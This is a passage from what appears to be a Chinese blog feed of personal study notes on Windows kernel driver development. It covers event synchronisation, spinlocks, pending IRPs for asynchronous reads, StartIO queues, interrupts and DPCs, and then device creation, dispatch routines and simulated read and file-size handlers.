<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">DWORD dwOutput;</span><br><span class="line">HANDLE hEvent = CreateEvent(<span class="literal">NULL</span>,FALSE,FALSE,<span class="literal">NULL</span>);</span><br><span class="line">HANDLE hThread = (HANDLE)_beginthreadex(<span class="literal">NULL</span>,<span class="number">0</span>,testThread,&amp;hEvent,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">bRet = DeviceIoControl(hDevcie,IOCTL_TEST,&amp;hEvent,<span class="keyword">sizeof</span>(hEvent),<span class="literal">NULL</span>,<span class="number">0</span>,&amp;dwOutput,<span class="literal">NULL</span>);</span><br><span class="line">WaitForSingleObject(hThread,INFINITE);</span><br><span class="line">CloseHandle(hDevcie);</span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">CloseHandle(hEvent);</span><br></pre></td></tr></table></figure>
<p>创建事件对象，创建线程，发送控制信号，注意的是我们一定要等待线程运行完毕，否则我们在下面关掉了hEvent可能会出现问题！</p>
<p>程序逻辑：</p>
<ol>
<li>用户层创建一个事件对象</li>
<li>用户层创建一个线程</li>
<li>用户层线程等待时间对象被激活</li>
<li>驱动激活事件对象</li>
<li>线程完毕</li>
<li>用户层等待线程完毕退出主线程</li>
</ol>
<p>内核与内核的交互Event事件的时候我们是用的是名称搜索方法。</p>
<p>这里需要注意的是内核线程必须要自己进行强制结束，系统不给回收。</p>
<h2 id="自旋锁-1"><a href="#自旋锁-1" class="headerlink" title="自旋锁"></a>自旋锁</h2><p>和互斥体很像，但是等待的时候是通过CPU一直访问，所以消耗的比较多，并且还会改变IRQL的级别，所以需要注意操作的内存。<br>并且：<br>DDK提供了两类互锁操作来提供简单的同步处理，一类是 InterlockedXX 函数，另类是ExInterlockedXX 函数。其中，InterlockedXX系列的函数不通过自旋锁实现，而ExInterlockedXX 系列函数通过自旋锁实现。InterlockedXX 系列函数不需要程序员提供自旋锁，内部不会提升IRQL，因此InterlockedXX函数可以操作非分页的数据，也可以操作分页的数据。而ExInterlockedXX需要程序员提供一个自旋锁，内部依靠这个自旋锁实现<br>同步，所有ExInterlockedXX不能操作分页内存的数据。<br>下面是相关的函数：<br><img src="img1.jpg" alt="自旋锁函数"></p>
<h2 id="驱动实现文件异步读取"><a href="#驱动实现文件异步读取" class="headerlink" title="驱动实现文件异步读取"></a>驱动实现文件异步读取</h2><p>写这个例程的时候，电脑蓝屏不下十次！！！<br>原因是书上写的少了一些内容和我抄错了一点，但是经过多次的测试终于找到了问题！<br>首先用户层要实现异步读取就要使用<code>FILE_FLAG_OVERLAPPED</code>标记，用户层代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">HANDLE hDevcie = CreateFile(<span class="string">"\\\\.\\HelloDDK"</span>,GENERIC_READ|GENERIC_WRITE,<span class="number">0</span>,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hDevcie == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"error"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>打开文件的话呢注意的是打开的标记要或上<code>FILE_FLAG_OVERLAPPED</code>标记：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">OVERLAPPED overlap1 = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">OVERLAPPED overlap2 = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">UCHAR buffer[<span class="number">10</span>];</span><br><span class="line">ULONG ulRead;</span><br><span class="line">BOOL bRead = ReadFile(hDevcie,buffer,<span class="number">10</span>,&amp;ulRead,&amp;overlap1);</span><br><span class="line"><span class="keyword">if</span> (!bRead &amp;&amp; GetLastError()==ERROR_IO_PENDING)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"overlap1 is pending!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">bRead = ReadFile(hDevcie,buffer,<span class="number">10</span>,&amp;ulRead,&amp;overlap2);</span><br><span class="line"><span class="keyword">if</span> (!bRead &amp;&amp; GetLastError()==ERROR_IO_PENDING)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"overlap2 is pending!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line">CloseHandle(hDevcie);</span><br></pre></td></tr></table></figure>
<p>我们县创建两个OVERLAPPED对象，其实这个对象里面应该填写我们的Event对象，但是我们这里不麻烦了，只是用异步的方式读取文件。</p>
<p>用户层写完之后我们就要写内核层：<br>首先我们要在IRP的CREATE函数中附加上这个：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">PDEVICE_EXTENSION pDevExt = (PDEVICE_EXTENSION)pDevObj-&gt;DeviceExtension;</span><br><span class="line">pDevExt-&gt;pIRPLinkListHead = (PLIST_ENTRY)ExAllocatePool(PagedPool, <span class="keyword">sizeof</span>(LIST_ENTRY));</span><br><span class="line">InitializeListHead(pDevExt-&gt;pIRPLinkListHead);</span><br><span class="line">KdPrint((<span class="string">"初始化irp_pending链表\n"</span>));</span><br></pre></td></tr></table></figure>
<p>但是在学习的过程中，并没有这块内容。<br>作用就是初始化我们的链表对象，这个链表对象是记录我们还在pending（挂起）的IRP。<br>然后我们在READ函数中编写：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">HelloDDKDeviceRead</span><span class="params">(IN PDEVICE_OBJECT pDevObj, IN PIRP pirp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	KdPrint((<span class="string">"Enter HelloDDKRead\n"</span>));</span><br><span class="line">	PDEVICE_EXTENSION pDevExt = (PDEVICE_EXTENSION)pDevObj-&gt;DeviceExtension;</span><br><span class="line">	PMY_IRP_ENTRY pIrp_entery = (PMY_IRP_ENTRY)ExAllocatePool(PagedPool, <span class="keyword">sizeof</span>(MY_IRP_ENTRY));</span><br><span class="line">	pIrp_entery-&gt;pIrp = pirp;</span><br><span class="line">	InsertHeadList(pDevExt-&gt;pIRPLinkListHead, &amp;pIrp_entery-&gt;listEntry);</span><br><span class="line">	IoMarkIrpPending(pirp);<span class="comment">//set pending</span></span><br><span class="line">	KdPrint((<span class="string">"leave read!\n"</span>));</span><br><span class="line">	<span class="keyword">return</span> STATUS_PENDING;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先是我们获取到设备扩展对象，然后申请一个自己的MYIRP结构体：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MY_IRP_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	PIRP pIrp;</span><br><span class="line">	LIST_ENTRY listEntry;</span><br><span class="line">&#125;*PMY_IRP_ENTRY, MY_IRP_ENTRY;</span><br></pre></td></tr></table></figure>
<p>然后加入我们的链表当中。</p>
<p>这样子用户层使用ReadFile将会返回<code>ERROR_IO_PENDING</code>。<br>在用户层使用CloseHandle的时候会调用CLEANUP例程，我们编写这个例程：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">HelloDDKDeviceCleanUp</span><span class="params">(IN PDEVICE_OBJECT pDevObj, IN PIRP pirp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	KdPrint((<span class="string">"Enter CleanUp\n"</span>));</span><br><span class="line">	PDEVICE_EXTENSION pDevExt = (PDEVICE_EXTENSION)pDevObj-&gt;DeviceExtension;</span><br><span class="line">	</span><br><span class="line">	PMY_IRP_ENTRY my_irp_entry;</span><br><span class="line">	<span class="keyword">while</span> (!IsListEmpty(pDevExt-&gt;pIRPLinkListHead))</span><br><span class="line">	&#123;</span><br><span class="line">		PLIST_ENTRY pEntry = RemoveHeadList(pDevExt-&gt;pIRPLinkListHead);</span><br><span class="line"></span><br><span class="line">		my_irp_entry = CONTAINING_RECORD(pEntry, MY_IRP_ENTRY, listEntry);</span><br><span class="line">		my_irp_entry-&gt;pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">		my_irp_entry-&gt;pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">		IoCompleteRequest(my_irp_entry-&gt;pIrp, IO_NO_INCREMENT);</span><br><span class="line">		ExFreePool(my_irp_entry);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	pirp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pirp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">	IoCompleteRequest(pirp, IO_NO_INCREMENT);</span><br><span class="line">	KdPrint((<span class="string">"leave Clean Up\n"</span>));</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先也是获得设备扩展对象，然后对链表进行一次遍历，将遍历得到的<code>PMY_IRP_ENTRY</code>结构体中的IRP进行操作完毕，然后响应这个ReadFile，再释放这块内存。<br>最后我们返回CLEANUP的这个STATUS。</p>
<p>这里需要注意的是<code>IoMarkIrpPending</code>函数可以设置IRP为挂起状态。</p>
<p>真是累，弄了一晚上才解决很多问题！！！</p>
<h2 id="StartIO串行"><a href="#StartIO串行" class="headerlink" title="StartIO串行"></a>StartIO串行</h2><p>由于IRP支持异步的处理，所以我们最好也将IRP进行一个串行处理，这样子有助于我们驱动的稳定性，这里简单的记录一下，因为下面会有多串。<br>首先我们要先提供一个startIO的例程给设备。<br><code>pDriverObject-&gt;DriverStartIo=HelloDDKStartIO;</code><br>我们要编写<code>HelloDDKStartIO</code>函数，这个函数的话呢我们需要注意的是，他与普通的IRP唯一的区别就是没有返回值。<br>这个StartIO例程运行在DISPATCH_LEVEL级别，因此这个例程是不会被线程所打断的。在声明时要加上#pragma LOCKEDCODE修饰符。<br>派遣函数如果想把IRP串行化，只需要加入IoStartPacket函数首先判断当前设备是“忙”还是“空闲”。如果设备“空闲”，则提升当前IRQL到DISPATCH_LEVEL级别，并进入StartIO例程“串行处理该”IRP请求。如果设备“忙”，则将IRP插入队列后返回。<br>其实就是说我们的在写Read之类的IRP的时候我们可以直接使用pending，然后调用这个IoStartPacket函数，然后当轮到我们的IRP执行的时候就会调用我们自己写的StartIO例程了。<br>在StartIO例程中我们需要调用IoStartNextPacket函数执行下一个StartIO例程。<br>其实这个Next函数比没有Next的函数却别就是他会操作一下IRP队列（删除我们之前执行的IRP）。<br>在这里还需要注意的我们在调用IoStartPacket的时候我们还需要提供一个取消函数（CancelIO时候调用的）。<br>这个函数用来处理我们的IRP的，这里需要判断的是，如果这个IRP是我们当前执行的话呢我们需要执行IONextPacket函数（因为要跳过当前执行），并且降低IRQL。不是当前执行的函数的话呢我们需要溢出队列。<br>这里还需要注意的是我们需要释放IRP-&gt;CancelIrpl这个自旋锁，因为他在CancelIO函数有一个申请的自旋锁。<br>还有一个需要注意的是我们在编写StartIO例程的时候我们判断如果当前是空闲的话呢就直接处理，而不是空闲的话呢我们就直接返回（因为后面他会进来的）。</p>
<h2 id="自定义StartIO"><a href="#自定义StartIO" class="headerlink" title="自定义StartIO"></a>自定义StartIO</h2><p>需要自己设置出队入队，并且在进入队列前，将当前的IRQL提升到  DISPATCH_LEVEL。然后在自己的StartIO例程中需要注意的是我们要自己处理队列中的IRP。<br>其实说白了自定义的StartIO其实就是处理队列的IRP，在Read这种的IRP中不作处理而是交由StartIO进行处理。<br>还有一点需要注意的是，我们插入队列的时候，如果KeInsertDeviceQueue函数返回的是假，说明队列之前没东西，我们要在调用一下自己的StartIO。</p>
<h2 id="中断服务例程"><a href="#中断服务例程" class="headerlink" title="中断服务例程"></a>中断服务例程</h2><p>如果不希望自己线程被切换到其他的线程的时候，我们需要将PASSIVE_LEVE;提升到DISPATCH_LEVEL级别。<br>DDK中将硬件中断命名为DIRQL。<br>如果想在DDK中使用中断服务例程ISR我们需要鲜活的中断对象，是一个名为INTERRUPT的数据结构。<br>DDK提供IOConnectInterrupt函数将中断对象和ISR联系。<br>如果想让代码不被ISR打断的话呢我们需要将IRQL提升到DIRQL级别，我们需要用到KeSynchronizeExecution函数：</p>
<ol>
<li>第一个参数是中断对象指针，与ISR关联。</li>
<li>第二个参数是我们要提供的不被打断的函数。</li>
<li>第三个参数是这个不被打断的函数的参数。</li>
</ol>
<h2 id="DPC延迟过程调用例程"><a href="#DPC延迟过程调用例程" class="headerlink" title="DPC延迟过程调用例程"></a>DPC延迟过程调用例程</h2><p>简单的说就是除了ISR代码优先级最高的了，所以我们讲一些不太重要的处理异常的代码放在这里。</p>
<ol>
<li>使用DPC例程的时候我们要先初始化DPC对象，要使用内核函数KeInitializeDpc<ol>
<li>第一个参数是DPC的指针</li>
<li>第二个是DPC例程函数</li>
<li>第三个是DPC例程函数的参数</li>
</ol>
</li>
<li>一般在DriverEntry中初始化DPC</li>
</ol>
]]></content>
      <categories>
        <category>驱动开发</category>
      </categories>
      <tags>
        <tag>驱动开发</tag>
      </tags>
  </entry>
  <entry>
    <title>IRP与派遣函数</title>
    <url>/2020/09/22/IRP%E4%B8%8E%E6%B4%BE%E9%81%A3%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="与用户程序进行交互"><a href="#与用户程序进行交互" class="headerlink" title="与用户程序进行交互"></a>与用户程序进行交互</h1><p>编写一个用户程序能够使用CreateFile进行交互的驱动。<br>首先我们的设备的符号连接名称是：<code>&quot;\\\\.\\HelloDDK&quot;</code>，由于取消转义，所以\比较多。<br>用户层程序：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hDevcie = CreateFile(<span class="string">"\\\\.\\HelloDDK"</span>,GENERIC_READ|GENERIC_WRITE,<span class="number">0</span>,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hDevcie == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"error"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(hDevcie);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就是一个简单的CreateFile得到句柄的程序，最后在退出的时候关闭句柄。</p>
<p>在驱动层首先我们要先创建一个设备，并且将设备关联上符号连接名，我们创建一个常用的CreateDevice函数，用来创建我们的设备，并且关联连接名。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span>  INITCODE</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">CreateDevice</span><span class="params">(IN PDRIVER_OBJECT pDriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	PDEVICE_OBJECT pDevObj;</span><br><span class="line">	PDEVICE_EXTENSION pDevExt;</span><br><span class="line">	UNICODE_STRING devName;</span><br><span class="line">	RtlInitUnicodeString(&amp;devName, <span class="string">L"\\Device\\WkerDDKDevice"</span>);</span><br><span class="line">	status = IoCreateDevice(pDriverObject, <span class="keyword">sizeof</span>(DEVICE_EXTENSION), &amp;devName, FILE_DEVICE_UNKNOWN, <span class="number">0</span>, TRUE, &amp;pDevObj);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line">	pDevObj-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line">	pDevExt = (PDEVICE_EXTENSION)pDevObj-&gt;DeviceExtension;</span><br><span class="line">	pDevExt-&gt;pDevice = pDevObj;</span><br><span class="line">	pDevExt-&gt;ustrDeviceName = devName;</span><br><span class="line">	<span class="comment">//创建符号连接</span></span><br><span class="line">	UNICODE_STRING symLinkName;</span><br><span class="line">	RtlInitUnicodeString(&amp;symLinkName, <span class="string">L"\\??\\HelloDDK"</span>);</span><br><span class="line">	pDevExt-&gt;ustrSymLinkName = symLinkName;</span><br><span class="line">	status = IoCreateSymbolicLink(&amp;symLinkName, &amp;devName);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">	&#123;</span><br><span class="line">		IoDeleteDevice(pDevObj);</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于这个函数是我们在进入驱动使用的，所以我们最好也加上INITCODE，节省一部分的内存，我们首先先是创建一个名字为WkerDDKDevice的设备程序，这个名称是我们不可见的。参数也比较简单，在此之前我们 还需要定义一个设备扩展对象的结构体：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DEVICE_EXTENSION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	PDEVICE_OBJECT pDevice;</span><br><span class="line">	UNICODE_STRING ustrDeviceName;<span class="comment">//设备名称</span></span><br><span class="line">	UNICODE_STRING ustrSymLinkName;<span class="comment">//符号连接名称</span></span><br><span class="line">&#125;DEVICE_EXTENSION, *PDEVICE_EXTENSION;</span><br></pre></td></tr></table></figure>
<p>我们创建完设备对象之后，我们将我们的设备对象相关的属性进行晚上，首先是我们需要支持缓冲区类型的读写，然后我们晚上设备扩展对象，这个东西比我们的全局变量是好用许多的，添加我们需要常用的字段信息，然后初始化我们的符号名，最后将设备名称和符号链接名进行连接，这样我们简单的设备就创建完毕了。</p>
<p>在DriverEntry中我们这样子写：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(IN PDRIVER_OBJECT pDriverObject,</span></span></span><br><span class="line"><span class="function"><span class="params">	IN PUNICODE_STRING pRegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pDriverObject-&gt;DriverUnload = Unload;</span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	pDriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = HelloDDKDispatchRoutin;</span><br><span class="line">	pDriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = HelloDDKDispatchRoutin;</span><br><span class="line">	pDriverObject-&gt;MajorFunction[IRP_MJ_CLEANUP] = HelloDDKDispatchRoutin;</span><br><span class="line">	status = CreateDevice(pDriverObject);</span><br><span class="line">	<span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将我们的Create、close、cleanup的irp派遣函数设置成一个。<br>我们接下来继续写我们的派遣函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">HelloDDKDispatchRoutin</span><span class="params">(IN PDEVICE_OBJECT pDevObj, IN PIRP pirp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	KdPrint((<span class="string">"进入IRP\n"</span>));</span><br><span class="line">	PIO_STACK_LOCATION <span class="built_in">stack</span> = IoGetCurrentIrpStackLocation(pirp);</span><br><span class="line">	</span><br><span class="line">	KdPrint((<span class="string">"%d"</span>, <span class="built_in">stack</span>-&gt;MajorFunction));</span><br><span class="line"></span><br><span class="line">	NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">	pirp-&gt;IoStatus.Status = status;</span><br><span class="line">	pirp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">	IoCompleteRequest(pirp, IO_NO_INCREMENT);</span><br><span class="line"></span><br><span class="line">	KdPrint((<span class="string">"离开IRP\n"</span>));</span><br><span class="line">	<span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参数的话呢是DDK给我们定义的，我们首先获取当前设备栈的stack对象，这个对象里面保存了我们当前级别的信息，里面有一个MajorFunction是定义到底是什么类型的操作调用了这个派遣函数（这个我不是用char定义了，有点麻烦），得到之后我门将返回值设为真，并且将设备栈的状态也设置为真，information为我们操作的字节数，这里给0吧，然后使用<code>IoCompleteRequest</code>函数返回我们的应用程序。</p>
<p>最终的效果：<br><img src="img1.jpg" alt="con"><br>其实我们也可以发现，close其实就是先调用了cleanup，然后调用了close。</p>
<h2 id="模拟读写操作（缓冲区）"><a href="#模拟读写操作（缓冲区）" class="headerlink" title="模拟读写操作（缓冲区）"></a>模拟读写操作（缓冲区）</h2><p>在应用程序使用ReadFile类型的函数的时候都是使用的CreateFile得到的handle，在驱动中都有相对的IRP处理。<br>例如我们使用ReadFile的时候相对应的驱动会调用<code>IRP_MJ_READ</code>的派遣函数。<br>我们只需在这个IRP中处理我们想要处理的内容就可以了。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">HelloDDKDispatchRoutin</span><span class="params">(IN PDEVICE_OBJECT pDevObj, IN PIRP pirp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	KdPrint((<span class="string">"进入IRP\n"</span>));</span><br><span class="line">	PIO_STACK_LOCATION <span class="built_in">stack</span> = IoGetCurrentIrpStackLocation(pirp);</span><br><span class="line"></span><br><span class="line">	KdPrint((<span class="string">"%d"</span>, <span class="built_in">stack</span>-&gt;MajorFunction));</span><br><span class="line"></span><br><span class="line">	NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">	pirp-&gt;IoStatus.Status = status;</span><br><span class="line">	pirp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">stack</span>-&gt;MajorFunction == <span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		ULONG ulReadLength = <span class="built_in">stack</span>-&gt;Parameters.Read.Length;</span><br><span class="line">		pirp-&gt;IoStatus.Information = ulReadLength; <span class="comment">// 设置实际读取的字节数</span></span><br><span class="line">		<span class="built_in">memset</span>(pirp-&gt;AssociatedIrp.SystemBuffer, <span class="number">0xAA</span>, ulReadLength); <span class="comment">//给缓冲区复制内存</span></span><br><span class="line">	&#125;</span><br><span class="line">	IoCompleteRequest(pirp, IO_NO_INCREMENT);</span><br><span class="line"></span><br><span class="line">	KdPrint((<span class="string">"离开IRP\n"</span>));</span><br><span class="line">	<span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了方便起见我还是将Read的派遣函数放在了这个通用的函数里面，但是我会判断设备栈的类型，如果是3也就是ReadFile的话呢我就做ReadFile的操作，首先我先获取他要获取的字节数，这个在<code>stack-&gt;Parameters.Read.Length</code>这个域里面保存着，我们只需要获取出来就可以了，然后热值IRP的操作字节数（其实也就是我们ReadFile里面真实读取个数的OUT参数），然后我们将缓冲区使用memset拷贝是个0xAA进去。<br>这样就完成了模拟一个读驱动，那么我们只需要在应用程序中执行：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//模拟读取操作</span></span><br><span class="line">	UCHAR buffer[<span class="number">10</span>];</span><br><span class="line">	ULONG ulRead;</span><br><span class="line">	<span class="keyword">bool</span> bRet = ReadFile(hDevcie,buffer,<span class="number">10</span>,&amp;ulRead,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"共读取字节数：%d\n"</span>,ulRead);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;(<span class="keyword">int</span>)ulRead;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%02X"</span>,buffer[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"读取数据出错"</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>打印出来是个0xAA。</p>
<p>写的话呢类似，只是我们写到的其实是我们设备扩展属性的一个buffer里面，需要注意的是不要超出界限，否则你懂的。</p>
<p>再写一个获取文件长度的函数吧。<br>首先我们先设置IRP：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pDriverObject-&gt;MajorFunction[IRP_MJ_QUERY_INFORMATION] = HelloDDKQueryInformation;</span><br></pre></td></tr></table></figure>
<p>然后编写派遣函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">HelloDDKQueryInformation</span><span class="params">(IN PDEVICE_OBJECT pDevObj, IN PIRP pirp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	KdPrint((<span class="string">"进入IRP查询文件长度\n"</span>));</span><br><span class="line">	PIO_STACK_LOCATION <span class="built_in">stack</span> = IoGetCurrentIrpStackLocation(pirp);</span><br><span class="line">	FILE_INFORMATION_CLASS info = <span class="built_in">stack</span>-&gt;Parameters.QueryFile.FileInformationClass;</span><br><span class="line">	<span class="keyword">if</span> (info == FileStandardInformation)</span><br><span class="line">	&#123;</span><br><span class="line">		PFILE_STANDARD_INFORMATION file_info = (PFILE_STANDARD_INFORMATION)pirp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">		file_info-&gt;EndOfFile = RtlConvertLongToLargeInteger(<span class="number">1314</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">	pirp-&gt;IoStatus.Status = status;</span><br><span class="line">	pirp-&gt;IoStatus.Information = <span class="built_in">stack</span>-&gt;Parameters.QueryFile.Length;</span><br><span class="line">	IoCompleteRequest(pirp, IO_NO_INCREMENT);</span><br><span class="line"></span><br><span class="line">	KdPrint((<span class="string">"离开IRP查询文件长度\n"</span>));</span><br><span class="line">	<span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实还是比较简单的，首先我们先获取设备栈，然后获取查询文件的类型，如果是标准的文件属性查询的话呢我们就获取IRP的系统buffer，这个字段有一个属性就是EndOfFile，表明读取的长度，是一个大整数，这里其实应该读取扩展设备的字段的，但是为了简单我就直接写了一个1314，然后下面的操作就是常规的操作，在最后的时候我们需要注意的是要将操作的字节数设置类设备战中查询文件的长度。<br>我们在应用程序中写：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">DWORD fileSize;</span><br><span class="line">DWORD low = GetFileSize(hDevcie,&amp;fileSize);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n文件长度%d\n"</span>,low);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"文件长度%d\n"</span>,fileSize);</span><br></pre></td></tr></table></figure>
<p>最后程序的运行效果：<br><img src="img2.jpg" alt="bf"><br>需要注意的是这个大小返回给应用程序的时候是有低32和高32的区别的。</p>
<p>！！！这里有一点需要注意。我搞了一个小时才搞明白的一个东西，就是运行驱动的时候突然提示文件找不到了，这个解释我一直不知道，但是直到我想到我的设备对象没有销毁的时候我才知道为啥，我们一定要在Unload的时候将我们的设备对象进行销毁。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span>  PAGECODE</span></span><br><span class="line"><span class="function">VOID <span class="title">Unload</span><span class="params">(IN PDRIVER_OBJECT pDriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	KdPrint((<span class="string">"Unload"</span>));</span><br><span class="line">	PDEVICE_OBJECT pNextObj;</span><br><span class="line">	pNextObj = pDriverObject-&gt;DeviceObject;</span><br><span class="line">	<span class="keyword">while</span> (pNextObj != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		PDEVICE_EXTENSION pDevExt = (PDEVICE_EXTENSION)pNextObj-&gt;DeviceExtension;</span><br><span class="line">		UNICODE_STRING pLinkName = pDevExt-&gt;ustrSymLinkName;</span><br><span class="line">		IoDeleteSymbolicLink(&amp;pLinkName);</span><br><span class="line">		pNextObj = pNextObj-&gt;NextDevice;</span><br><span class="line">		IoDeleteDevice(pDevExt-&gt;pDevice);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>删除设备和设备对象，并且是整个链表都删除！</p>
<p>而且需要注意的额是，我们在设置设备对象的Flags属性的时候我们要加上DO_BUFFER_IO属性。</p>
